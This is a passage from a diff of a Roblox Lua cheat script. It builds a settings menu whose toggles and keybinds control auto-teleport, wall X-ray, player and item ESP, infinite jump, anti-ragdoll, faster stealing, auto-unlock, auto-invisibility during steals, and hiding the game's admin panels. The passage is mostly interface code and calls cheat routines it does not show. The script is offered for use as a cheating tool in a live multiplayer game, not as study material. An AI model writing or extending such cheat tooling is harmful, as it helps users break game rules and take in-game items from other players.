+        TweenService:Create(sw,  TweenInfo.new(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out), {BackgroundColor3=tc}):Play()
+    end
+    btn.MouseButton1Click:Connect(function() callback(not isOn, SetState) end)
+    return {Set=SetState, Container=sw}
+end
+
+local function CreateRow(text, height)
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1,0,0,height or 34); row.BackgroundColor3 = Theme.Surface
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size = UDim2.new(0.6,0,1,0); lbl.Position = UDim2.new(0,10,0,0)
+    lbl.BackgroundTransparency = 1; lbl.Text = text
+    lbl.Font = Enum.Font.GothamMedium; lbl.TextColor3 = Theme.TextPrimary
+    lbl.TextSize = 12; lbl.TextXAlignment = Enum.TextXAlignment.Left
+    row.Parent = sList; return row
+end
+
+local function CreateSectionHeader(text)
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1, 0, 0, 28)
+    row.BackgroundTransparency = 1
+    row.Parent = sList
+    
+    local accent = Instance.new("Frame", row)
+    accent.Size = UDim2.new(0, 3, 0, 16)
+    accent.Position = UDim2.new(0, 4, 0.5, -8)
+    accent.BackgroundColor3 = Theme.Accent1
+    accent.BorderSizePixel = 0
+    Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 2)
+    
+    local lbl = Instance.new("TextLabel", row)
+    lbl.Size = UDim2.new(1, -20, 1, 0)
+    lbl.Position = UDim2.new(0, 14, 0, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = Theme.Accent1
+    lbl.TextSize = 11
+    lbl.Font = Enum.Font.GothamBlack
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    
+    local line = Instance.new("Frame", row)
+    line.Size = UDim2.new(1, -80, 0, 1)
+    line.Position = UDim2.new(0, 75, 0.5, 0)
+    line.BackgroundColor3 = Theme.Accent1
+    line.BackgroundTransparency = 0.7
+    line.BorderSizePixel = 0
+    
+    return row
+end
+
+CreateRow("Auto TP on Script Load")
+CreateToggleSwitch(sList:FindFirstChildOfClass("Frame"), Config.TpSettings.TpOnLoad, function(ns, set)
+    set(ns); Config.TpSettings.TpOnLoad = ns; SaveConfig()
+    ShowNotification("AUTO TP ON LOAD", ns and "ENABLED" or "DISABLED")
+end)
+
+local rMinGen = CreateRow("Min Gen for Auto TP")
+local minGenBox = Instance.new("TextBox", rMinGen)
+minGenBox.Size = UDim2.new(0, 100, 0, 24)
+minGenBox.Position = UDim2.new(1, -110, 0.5, -12)
+minGenBox.BackgroundColor3 = Theme.SurfaceHighlight
+minGenBox.Text = tostring(Config.TpSettings.MinGenForTp or "")
+minGenBox.Font = Enum.Font.Gotham
+minGenBox.TextSize = 11
+minGenBox.TextColor3 = Theme.TextPrimary
+minGenBox.PlaceholderText = "e.g. 5k, 1m, 1b"
+Instance.new("UICorner", minGenBox).CornerRadius = UDim.new(0, 4)
+minGenBox.FocusLost:Connect(function()
+    local raw = minGenBox.Text:gsub("%s", "")
+    Config.TpSettings.MinGenForTp = (raw == "" and "" or raw)
+    SaveConfig()
+    ShowNotification("MIN GEN FOR TP", Config.TpSettings.MinGenForTp == "" and "No minimum" or "Min: " .. (Config.TpSettings.MinGenForTp or ""))
+end)
+
+local rFPS = CreateRow("FPS Boost")
+CreateToggleSwitch(rFPS, Config.FPSBoost, function(ns, set)
+    set(ns); setFPSBoost(ns)
+    ShowNotification("FPS BOOST", ns and "ENABLED" or "DISABLED")
+end)
+
+local rTrace = CreateRow("Tracer Best Brainrot")
+CreateToggleSwitch(rTrace, Config.TracerEnabled, function(ns, set)
+    set(ns); Config.TracerEnabled = ns; SaveConfig()
+    ShowNotification("TRACER", ns and "ENABLED" or "DISABLED")
+end)
+
+local rLineToBase = CreateRow("Line to base")
+CreateToggleSwitch(rLineToBase, Config.LineToBase, function(ns, set)
+    set(ns); Config.LineToBase = ns; SaveConfig()
+    if not ns and _G.resetPlotBeam then pcall(_G.resetPlotBeam) end
+    ShowNotification("LINE TO BASE", ns and "ENABLED" or "DISABLED")
+end)
+
+local rXray = CreateRow("X-Ray")
+CreateToggleSwitch(rXray, Config.XrayEnabled, function(ns, set)
+    set(ns); Config.XrayEnabled = ns; if ns then enableXray() else disableXray() end; SaveConfig()
+    ShowNotification("X-RAY", ns and "ENABLED" or "DISABLED")
+end)
+
+CreateSectionHeader("Auto TP")
+local toolOptions = {"Flying Carpet", "Cupid's Wings", "Santa's Sleigh", "Witch's Broom"}
+local toolSwitches = {}
+for _, toolName in ipairs(toolOptions) do
+    local r = CreateRow(toolName)
+    local ts = CreateToggleSwitch(r, Config.TpSettings.Tool==toolName, function(rs, set)
+        if rs then
+            Config.TpSettings.Tool=toolName; SaveConfig(); set(true)
+            for n, sw in pairs(toolSwitches) do if n~=toolName then sw.Set(false) end end
+            ShowNotification("TP TOOL", toolName)
+        else
+            set(Config.TpSettings.Tool==toolName)
+        end
+    end)
+    toolSwitches[toolName] = ts
+end
+
+local rSpeed = CreateRow("Teleport Delay (1=Fast)")
+local speedCont = Instance.new("Frame", rSpeed)
+speedCont.Size = UDim2.new(0,100,0,24); speedCont.Position = UDim2.new(1,-110,0.5,-12); speedCont.BackgroundTransparency=1
+local speedBtns = {}
+for i = 1, 4 do
+    local b = Instance.new("TextButton", speedCont)
+    b.Size = UDim2.new(0.22,0,1,0); b.Position = UDim2.new((i-1)*0.26,0,0,0)
+    local act = Config.TpSettings.Speed==i
+    b.BackgroundColor3 = act and Theme.Accent1 or Theme.SurfaceHighlight
+    b.Text = tostring(i); b.TextColor3 = act and Color3.new(0,0,0) or Theme.TextPrimary
+    b.Font = Enum.Font.GothamBold; b.TextSize = 12
+    Instance.new("UICorner",b).CornerRadius = UDim.new(0,4)
+    b.MouseButton1Click:Connect(function()
+        Config.TpSettings.Speed=i; SaveConfig()
+        for idx, btn in ipairs(speedBtns) do
+            local a=(idx==i); btn.BackgroundColor3=a and Theme.Accent1 or Theme.SurfaceHighlight
+            btn.TextColor3=a and Color3.new(0,0,0) or Theme.TextPrimary
+        end
+        ShowNotification("TP SPEED", "Set to " .. tostring(i))
+    end)
+    table.insert(speedBtns,b)
+end
+
+local rBind = CreateRow("TP Keybind")
+local bBind = Instance.new("TextButton", rBind)
+bBind.Size=UDim2.new(0,60,0,24); bBind.Position=UDim2.new(1,-70,0.5,-12)
+bBind.BackgroundColor3=Theme.SurfaceHighlight; bBind.Text=Config.TpSettings.TpKey
+bBind.Font=Enum.Font.GothamBold; bBind.TextColor3=Theme.TextPrimary; bBind.TextSize=12
+Instance.new("UICorner",bBind).CornerRadius=UDim.new(0,4)
+bBind.MouseButton1Click:Connect(function()
+    bBind.Text="..."; bBind.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.TpSettings.TpKey=inp.KeyCode.Name; bBind.Text=inp.KeyCode.Name
+            bBind.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("TP KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+local rBindClone = CreateRow("Auto Clone Keybind")
+local bBindClone = Instance.new("TextButton", rBindClone)
+bBindClone.Size=UDim2.new(0,60,0,24); bBindClone.Position=UDim2.new(1,-70,0.5,-12)
+bBindClone.BackgroundColor3=Theme.SurfaceHighlight; bBindClone.Text=Config.TpSettings.CloneKey
+bBindClone.Font=Enum.Font.GothamBold; bBindClone.TextColor3=Theme.TextPrimary; bBindClone.TextSize=12
+Instance.new("UICorner",bBindClone).CornerRadius=UDim.new(0,4)
+bBindClone.MouseButton1Click:Connect(function()
+    bBindClone.Text="..."; bBindClone.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.TpSettings.CloneKey=inp.KeyCode.Name; bBindClone.Text=inp.KeyCode.Name
+            bBindClone.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("CLONE KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+CreateSectionHeader("CARPET SPEED")
+local rCarpetBind = CreateRow("Carpet Speed Keybind")
+local bCarpet = Instance.new("TextButton", rCarpetBind)
+bCarpet.Size=UDim2.new(0,60,0,24); bCarpet.Position=UDim2.new(1,-70,0.5,-12)
+bCarpet.BackgroundColor3=Theme.SurfaceHighlight; bCarpet.Text=Config.TpSettings.CarpetSpeedKey
+bCarpet.Font=Enum.Font.GothamBold; bCarpet.TextColor3=Theme.TextPrimary; bCarpet.TextSize=12
+Instance.new("UICorner",bCarpet).CornerRadius=UDim.new(0,4)
+bCarpet.MouseButton1Click:Connect(function()
+    bCarpet.Text="..."; bCarpet.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.TpSettings.CarpetSpeedKey=inp.KeyCode.Name; bCarpet.Text=inp.KeyCode.Name
+            bCarpet.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("CARPET SPEED KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+local rRagdollSelf = CreateRow("Ragdoll Self Keybind")
+local bRagdollSelf = Instance.new("TextButton", rRagdollSelf)
+bRagdollSelf.Size=UDim2.new(0,60,0,24); bRagdollSelf.Position=UDim2.new(1,-70,0.5,-12)
+bRagdollSelf.BackgroundColor3=Theme.SurfaceHighlight; bRagdollSelf.Text=Config.RagdollSelfKey ~= "" and Config.RagdollSelfKey or "NONE"
+bRagdollSelf.Font=Enum.Font.GothamBold; bRagdollSelf.TextColor3=Theme.TextPrimary; bRagdollSelf.TextSize=12
+Instance.new("UICorner",bRagdollSelf).CornerRadius=UDim.new(0,4)
+bRagdollSelf.MouseButton1Click:Connect(function()
+    bRagdollSelf.Text="..."; bRagdollSelf.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.RagdollSelfKey=inp.KeyCode.Name; bRagdollSelf.Text=inp.KeyCode.Name
+            bRagdollSelf.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("RAGDOLL SELF KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+local rCarpetStatus = CreateRow("Carpet Speed Status")
+local carpetStatusLbl = Instance.new("TextLabel", rCarpetStatus)
+carpetStatusLbl.Size=UDim2.new(0,50,0,20); carpetStatusLbl.Position=UDim2.new(1,-60,0.5,-10)
+carpetStatusLbl.BackgroundTransparency=1
+carpetStatusLbl.Text=carpetSpeedEnabled and "ON" or "OFF"
+carpetStatusLbl.TextColor3=carpetSpeedEnabled and Theme.Success or Theme.Error
+carpetStatusLbl.Font=Enum.Font.GothamBlack; carpetStatusLbl.TextSize=13
+carpetStatusLbl.TextXAlignment=Enum.TextXAlignment.Right
+_carpetStatusLabel = carpetStatusLbl
+
+CreateSectionHeader("MOVEMENT")
+local rInfJump = CreateRow("Infinite Jump")
+CreateToggleSwitch(rInfJump, infiniteJumpEnabled, function(ns, set)
+    set(ns); setInfiniteJump(ns)
+    ShowNotification("INFINITE JUMP", ns and "ENABLED" or "DISABLED")
+end)
+local rAutoStealSpeed = CreateRow("Auto Steal Speed")
+CreateToggleSwitch(rAutoStealSpeed, Config.AutoStealSpeed, function(ns, set)
+    set(ns); Config.AutoStealSpeed = ns; SaveConfig()
+    ShowNotification("AUTO STEAL SPEED", ns and "ENABLED" or "DISABLED")
+end)
+
+local rStealSpeedKey = CreateRow("Steal Speed Keybind")
+local bStealSpeedKey = Instance.new("TextButton", rStealSpeedKey)
+bStealSpeedKey.Size=UDim2.new(0,60,0,24); bStealSpeedKey.Position=UDim2.new(1,-70,0.5,-12)
+bStealSpeedKey.BackgroundColor3=Theme.SurfaceHighlight; bStealSpeedKey.Text=Config.StealSpeedKey
+bStealSpeedKey.Font=Enum.Font.GothamBold; bStealSpeedKey.TextColor3=Theme.TextPrimary; bStealSpeedKey.TextSize=12
+Instance.new("UICorner",bStealSpeedKey).CornerRadius=UDim.new(0,4)
+bStealSpeedKey.MouseButton1Click:Connect(function()
+    bStealSpeedKey.Text="..."; bStealSpeedKey.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.StealSpeedKey=inp.KeyCode.Name; bStealSpeedKey.Text=inp.KeyCode.Name
+            bStealSpeedKey.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("STEAL SPEED KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+CreateSectionHeader("AUTO UNLOCK")
+local rAutoUnlock = CreateRow("Auto Unlock on Steal")
+CreateToggleSwitch(rAutoUnlock, Config.AutoUnlockOnSteal, function(ns, set)
+    set(ns); Config.AutoUnlockOnSteal = ns; SaveConfig()
+    ShowNotification("AUTO UNLOCK", ns and "ENABLED" or "DISABLED")
+end)
+
+local rShowUnlockHUD = CreateRow("Show Unlock Buttons HUD")
+CreateToggleSwitch(rShowUnlockHUD, Config.ShowUnlockButtonsHUD, function(ns, set)
+    set(ns); Config.ShowUnlockButtonsHUD = ns; SaveConfig()
+    local hudGui = PlayerGui:FindFirstChild("BullysStatusHUD")
+    if hudGui then
+        local main = hudGui:FindFirstChild("Main")
+        local unlockContainer = main and main:FindFirstChild("UnlockButtonsContainer")
+        if main and unlockContainer then
+            unlockContainer.Visible = ns
+            if ns then
+                TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    Size = UDim2.new(0, 500, 0, 100)
+                }):Play()
+            else
+                TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    Size = UDim2.new(0, 500, 0, 50)
+                }):Play()
+            end
+        end
+    end
+end)
+CreateSectionHeader("ANTI-RAGDOLL")
+local arV1SetRef, arV2SetRef = {}, {}
+local rAr = CreateRow("V1")
+CreateToggleSwitch(rAr, Config.AntiRagdoll > 0, function(ns, set)
+    arV1SetRef.fn = set
+    if ns and Config.AntiRagdollV2 then
+        set(false)
+        ShowNotification("ANTI-RAGDOLL", "DISABLE V2 FIRST")
+        return
+    end
+    set(ns)
+    local mode = ns and 1 or 0
+    Config.AntiRagdoll = mode
+    if ns then
+        Config.AntiRagdollV2 = false
+        if arV2SetRef.fn then arV2SetRef.fn(false) end
+    end
+    SaveConfig()
+    startAntiRagdoll(mode)
+    if ns then startAntiRagdollV2(false) end
+    ShowNotification("ANTI-RAGDOLL V1", ns and "ENABLED" or "DISABLED")
+end)
+local rArV2 = CreateRow("V2")
+CreateToggleSwitch(rArV2, Config.AntiRagdollV2, function(ns, set)
+    arV2SetRef.fn = set
+    if ns and Config.AntiRagdoll > 0 then
+        set(false)
+        ShowNotification("ANTI-RAGDOLL", "DISABLE V1 FIRST")
+        return
+    end
+    set(ns)
+    Config.AntiRagdollV2 = ns
+    if ns then
+        Config.AntiRagdoll = 0
+        SaveConfig()
+        if arV1SetRef.fn then arV1SetRef.fn(false) end
+        startAntiRagdoll(0)
+        startAntiRagdollV2(true)
+    else
+        SaveConfig()
+        startAntiRagdollV2(false)
+    end
+    ShowNotification("ANTI-RAGDOLL V2", ns and "ENABLED" or "DISABLED")
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+CreateSectionHeader("ESP")
+
+local rXray = CreateRow("Base X-Ray")
+local xrayToggle = CreateToggleSwitch(rXray, xrayEnabled, function(ns, set)
+    set(ns)
+    if ns then
+        enableXray()
+        xrayDescConn = Workspace.DescendantAdded:Connect(function(obj)
+            if xrayEnabled and obj:IsA("BasePart") and obj.Anchored and isBaseWall(obj) then
+                originalTransparency[obj] = obj.LocalTransparencyModifier
+                obj.LocalTransparencyModifier = 0.85
+            end
+        end)
+    else
+        disableXray()
+    end
+    Config.XrayEnabled = ns; SaveConfig()
+    ShowNotification("BASE X-RAY", ns and "ENABLED" or "DISABLED")
+end)
+local playerESPToggleRef = {setFn=nil}
+local rPlayerEsp = CreateRow("Player ESP (Hides Names)")
+CreateToggleSwitch(rPlayerEsp, Config.PlayerESP, function(ns, set)
+    set(ns); Config.PlayerESP = ns; SaveConfig()
+    if playerESPToggleRef.setFn then playerESPToggleRef.setFn(ns) end
+    ShowNotification("PLAYER ESP", ns and "ENABLED" or "DISABLED")
+end)
+
+local espToggleRef = {enabled=true, setFn=nil}
+local rEsp = CreateRow("Brainrot ESP")
+local espSettingsSwitch = CreateToggleSwitch(rEsp, Config.BrainrotESP, function(ns, set)
+    set(ns); Config.BrainrotESP = ns; SaveConfig()
+    if espToggleRef.setFn then espToggleRef.setFn(ns) end
+    ShowNotification("BRAINROT ESP", ns and "ENABLED" or "DISABLED")
+end)
+local subspaceMineESPToggleRef = {setFn=nil}
+local rSubspaceMineEsp = CreateRow("Subspace Mine Esp")
+CreateToggleSwitch(rSubspaceMineEsp, Config.SubspaceMineESP, function(ns, set)
+    set(ns); Config.SubspaceMineESP = ns; SaveConfig()
+    if subspaceMineESPToggleRef.setFn then subspaceMineESPToggleRef.setFn(ns) end
+    ShowNotification("SUBSPACE MINE ESP", ns and "ENABLED" or "DISABLED")
+end)
+CreateSectionHeader("AUTO STEAL DEFAULTS")
+local nearestToggleRef = {}
+local highestToggleRef = {}
+local priorityToggleRef = {}
+local autoTPPriorityToggleRef = {setFn = nil}
+
+local rDefaultNearest = CreateRow("Default To Nearest")
+local nearestToggleSwitch = CreateToggleSwitch(rDefaultNearest, Config.DefaultToNearest, function(ns, set)
+    if ns then
+        Config.DefaultToNearest = true
+        Config.DefaultToHighest = false
+        Config.DefaultToPriority = false
+        set(true)
+        if highestToggleRef.setFn then highestToggleRef.setFn(false) end
+        if priorityToggleRef.setFn then priorityToggleRef.setFn(false) end
+        
+        Config.AutoTPPriority = true
+        if autoTPPriorityToggleRef and autoTPPriorityToggleRef.setFn then
+            autoTPPriorityToggleRef.setFn(true)
+        end
+    else
+        local otherDefaults = Config.DefaultToHighest or Config.DefaultToPriority
+        if not otherDefaults then
+            set(true)
+            ShowNotification("DEFAULT MODE", "At least one default must be enabled")
+            return
+        end
+        Config.DefaultToNearest = false
+        set(false)
+    end
+    SaveConfig()
+    ShowNotification("DEFAULT TO NEAREST", ns and "ENABLED" or "DISABLED")
+end)
+nearestToggleRef.setFn = nearestToggleSwitch.Set
+
+local rDefaultHighest = CreateRow("Default To Highest")
+local highestToggleSwitch = CreateToggleSwitch(rDefaultHighest, Config.DefaultToHighest, function(ns, set)
+    if ns then
+        Config.DefaultToNearest = false
+        Config.DefaultToHighest = true
+        Config.DefaultToPriority = false
+        set(true)
+        if nearestToggleRef.setFn then nearestToggleRef.setFn(false) end
+        if priorityToggleRef.setFn then priorityToggleRef.setFn(false) end
+        
+        Config.AutoTPPriority = false
+        if autoTPPriorityToggleRef and autoTPPriorityToggleRef.setFn then
+            autoTPPriorityToggleRef.setFn(false)
+        end
+    else
+        local otherDefaults = Config.DefaultToNearest or Config.DefaultToPriority
+        if not otherDefaults then
+            set(true)
+            ShowNotification("DEFAULT MODE", "At least one default must be enabled")
+            return
+        end
+        Config.DefaultToHighest = false
+        set(false)
+    end
+    SaveConfig()
+    ShowNotification("DEFAULT TO HIGHEST", ns and "ENABLED" or "DISABLED")
+end)
+highestToggleRef.setFn = highestToggleSwitch.Set
+
+local rDefaultPriority = CreateRow("Default To Priority")
+local priorityToggleSwitch = CreateToggleSwitch(rDefaultPriority, Config.DefaultToPriority, function(ns, set)
+    if ns then
+        Config.DefaultToNearest = false
+        Config.DefaultToHighest = false
+        Config.DefaultToPriority = true
+        set(true)
+        if nearestToggleRef.setFn then nearestToggleRef.setFn(false) end
+        if highestToggleRef.setFn then highestToggleRef.setFn(false) end
+        
+        Config.AutoTPPriority = true
+        if autoTPPriorityToggleRef and autoTPPriorityToggleRef.setFn then
+            autoTPPriorityToggleRef.setFn(true)
+        end
+    else
+        local otherDefaults = Config.DefaultToNearest or Config.DefaultToHighest
+        if not otherDefaults then
+            set(true)
+            ShowNotification("DEFAULT MODE", "At least one default must be enabled")
+            return
+        end
+        Config.DefaultToPriority = false
+        set(false)
+    end
+    SaveConfig()
+    ShowNotification("DEFAULT TO PRIORITY", ns and "ENABLED" or "DISABLED")
+end)
+priorityToggleRef.setFn = priorityToggleSwitch.Set
+
+CreateSectionHeader("AUTOMATION")
+local rAutoInvis = CreateRow("Auto Invis During Steal")
+CreateToggleSwitch(rAutoInvis, Config.AutoInvisDuringSteal, function(ns, set)
+    set(ns); Config.AutoInvisDuringSteal = ns; _G.AutoInvisDuringSteal = ns; SaveConfig()
+    ShowNotification("AUTO INVIS", ns and "ENABLED" or "DISABLED")
+end)
+local rAutoTpFail = CreateRow("Auto TP on Failed Steal")
+CreateToggleSwitch(rAutoTpFail, Config.AutoTpOnFailedSteal, function(ns, set)
+    set(ns); Config.AutoTpOnFailedSteal = ns; SaveConfig()
+    ShowNotification("AUTO TP ON FAILED STEAL", ns and "ENABLED" or "DISABLED")
+end)
+local rAutoTpPriority = CreateRow("Auto TP Priority Mode")
+local autoTPPriorityToggleSwitch = CreateToggleSwitch(rAutoTpPriority, Config.AutoTPPriority, function(ns, set)
+    set(ns); Config.AutoTPPriority = ns; SaveConfig()
+    ShowNotification("AUTO TP PRIORITY", ns and "PRIORITY" or "HIGHEST")
+end)
+autoTPPriorityToggleRef.setFn = autoTPPriorityToggleSwitch.Set
+local rAutoKick = CreateRow("Auto-Kick on Steal")
+CreateToggleSwitch(rAutoKick, Config.AutoKickOnSteal, function(ns, set)
+    set(ns); Config.AutoKickOnSteal = ns; SaveConfig()
+    ShowNotification("AUTO-KICK ON STEAL", ns and "ENABLED" or "DISABLED")
+end)
+
+CreateSectionHeader("HIDE GUIS")
+local rHideAdminPanel = CreateRow("Hide Admin Panel GUI")
+CreateToggleSwitch(rHideAdminPanel, Config.HideAdminPanel, function(ns, set)
+    set(ns); Config.HideAdminPanel = ns; SaveConfig()
+    local adUI = PlayerGui:FindFirstChild("XiAdminPanel")
+    if adUI then adUI.Enabled = not ns end
+    ShowNotification("HIDE ADMIN PANEL", ns and "ENABLED" or "DISABLED")
+end)
+local rHideAdminToolsPanel = CreateRow("Hide Admin Tools Panel GUI")
+CreateToggleSwitch(rHideAdminToolsPanel, Config.ShowAdminToolsPanel == false, function(ns, set)
+    set(ns); Config.ShowAdminToolsPanel = not ns; SaveConfig()
+    local toolsGui = PlayerGui:FindFirstChild("XiAdminToolsPanel")
+    if toolsGui then toolsGui.Enabled = not ns end
+    if SharedState.AdminToolsSetEnabled then pcall(SharedState.AdminToolsSetEnabled, not ns) end
+    if ns then
+        Config.ClickToAP = false; State.ProximityAPActive = false; SaveConfig()
+        if SharedState.UpdateClickToAPButton then SharedState.UpdateClickToAPButton() end
+        if SharedState.UpdateProximityAPButton then SharedState.UpdateProximityAPButton() end
+    end
+    ShowNotification("HIDE ADMIN TOOLS", ns and "ENABLED" or "DISABLED")
+end)
+local rHideAutoSteal = CreateRow("Hide Auto Steal GUI")
+CreateToggleSwitch(rHideAutoSteal, Config.HideAutoSteal, function(ns, set)
+    set(ns); Config.HideAutoSteal = ns; SaveConfig()
+    local asUI = PlayerGui:FindFirstChild("AutoStealUI")
+    if asUI then asUI.Enabled = not ns end
+    ShowNotification("HIDE AUTO STEAL", ns and "ENABLED" or "DISABLED")
+end)
+CreateSectionHeader("EXTRAS")   
+
+local rResetKey = CreateRow("Reset")
+local bResetKey = Instance.new("TextButton", rResetKey)
+bResetKey.Size=UDim2.new(0,60,0,24); bResetKey.Position=UDim2.new(1,-70,0.5,-12)
+bResetKey.BackgroundColor3=Theme.SurfaceHighlight; bResetKey.Text=Config.ResetKey
+bResetKey.Font=Enum.Font.GothamBold; bResetKey.TextColor3=Theme.TextPrimary; bResetKey.TextSize=12
+Instance.new("UICorner",bResetKey).CornerRadius=UDim.new(0,4)
+bResetKey.MouseButton1Click:Connect(function()
+    bResetKey.Text="..."; bResetKey.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.ResetKey=inp.KeyCode.Name; bResetKey.Text=inp.KeyCode.Name
+            bResetKey.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("RESET KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+local rKickKey = CreateRow("Kick")
+local bKickKey = Instance.new("TextButton", rKickKey)
+bKickKey.Size=UDim2.new(0,60,0,24); bKickKey.Position=UDim2.new(1,-70,0.5,-12)
+bKickKey.BackgroundColor3=Theme.SurfaceHighlight; bKickKey.Text=Config.KickKey ~= "" and Config.KickKey or "NONE"
+bKickKey.Font=Enum.Font.GothamBold; bKickKey.TextColor3=Theme.TextPrimary; bKickKey.TextSize=12
+Instance.new("UICorner",bKickKey).CornerRadius=UDim.new(0,4)
+bKickKey.MouseButton1Click:Connect(function()
+    bKickKey.Text="..."; bKickKey.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.KickKey=inp.KeyCode.Name; bKickKey.Text=inp.KeyCode.Name
+            bKickKey.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("KICK KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+local rCleanErrors = CreateRow("Clean Error GUIs")
+CreateToggleSwitch(rCleanErrors, Config.CleanErrorGUIs, function(ns, set)
+    set(ns); Config.CleanErrorGUIs = ns; SaveConfig()
+    ShowNotification("CLEAN ERROR GUIS", ns and "ENABLED" or "DISABLED")
+end)
+
+
+CreateSectionHeader("ADMIN PANEL")
+local rClickToAP = CreateRow("Click To Admin Panel")
+CreateToggleSwitch(rClickToAP, Config.ClickToAP, function(ns, set)
+    set(ns); Config.ClickToAP = ns; SaveConfig()
+    ShowNotification("CLICK TO AP", ns and "ENABLED" or "DISABLED")
+end)
+local rClickToAPSingle = CreateRow("Click To AP Single Command")
+CreateToggleSwitch(rClickToAPSingle, Config.ClickToAPSingleCommand, function(ns, set)
+    set(ns); Config.ClickToAPSingleCommand = ns; SaveConfig()
+    ShowNotification("CLICK TO AP SINGLE", ns and "ENABLED" or "DISABLED")
+end)
+local rClickToAPKeybind = CreateRow("Click To AP Keybind")
+local bClickToAPKeybind = Instance.new("TextButton", rClickToAPKeybind)
+bClickToAPKeybind.Size=UDim2.new(0,60,0,24); bClickToAPKeybind.Position=UDim2.new(1,-65,0.5,-12)
+bClickToAPKeybind.BackgroundColor3=Theme.SurfaceHighlight; bClickToAPKeybind.Text=Config.ClickToAPKeybind or "L"
+bClickToAPKeybind.Font=Enum.Font.GothamBold; bClickToAPKeybind.TextColor3=Theme.TextPrimary; bClickToAPKeybind.TextSize=12
+Instance.new("UICorner",bClickToAPKeybind).CornerRadius=UDim.new(0,4)
+bClickToAPKeybind.MouseButton1Click:Connect(function()
+    bClickToAPKeybind.Text="..."; bClickToAPKeybind.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.ClickToAPKeybind=inp.KeyCode.Name; bClickToAPKeybind.Text=inp.KeyCode.Name
+            bClickToAPKeybind.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("CLICK TO AP KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+local rProximityAPKeybind = CreateRow("Proximity AP Keybind")
+local bProximityAPKeybind = Instance.new("TextButton", rProximityAPKeybind)
+bProximityAPKeybind.Size=UDim2.new(0,60,0,24); bProximityAPKeybind.Position=UDim2.new(1,-70,0.5,-12)
+bProximityAPKeybind.BackgroundColor3=Theme.SurfaceHighlight; bProximityAPKeybind.Text=Config.ProximityAPKeybind or "P"
+bProximityAPKeybind.Font=Enum.Font.GothamBold; bProximityAPKeybind.TextColor3=Theme.TextPrimary; bProximityAPKeybind.TextSize=12
+Instance.new("UICorner",bProximityAPKeybind).CornerRadius=UDim.new(0,4)
+bProximityAPKeybind.MouseButton1Click:Connect(function()
+    bProximityAPKeybind.Text="..."; bProximityAPKeybind.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.ProximityAPKeybind=inp.KeyCode.Name; bProximityAPKeybind.Text=inp.KeyCode.Name
+            bProximityAPKeybind.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("PROXIMITY AP KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+CreateSectionHeader("ALERTS")
+local rAlertsEnabled = CreateRow("Enable Alerts")
+CreateToggleSwitch(rAlertsEnabled, Config.AlertsEnabled, function(ns, set)
+    set(ns); Config.AlertsEnabled = ns; SaveConfig()
+    ShowNotification("PRIORITY ALERTS", ns and "ENABLED" or "DISABLED")
+end)
+local rAlertSound = CreateRow("Alert Sound ID")
+local soundBox = Instance.new("TextBox", rAlertSound)
+soundBox.Size = UDim2.new(0, 180, 0, 24)
+soundBox.Position = UDim2.new(1, -185, 0.5, -12)
+soundBox.BackgroundColor3 = Theme.SurfaceHighlight
+soundBox.Text = Config.AlertSoundID or "rbxassetid://6518811702"
+soundBox.Font = Enum.Font.Gotham
+soundBox.TextSize = 10
+soundBox.TextColor3 = Theme.TextPrimary
+soundBox.PlaceholderText = "Sound ID"
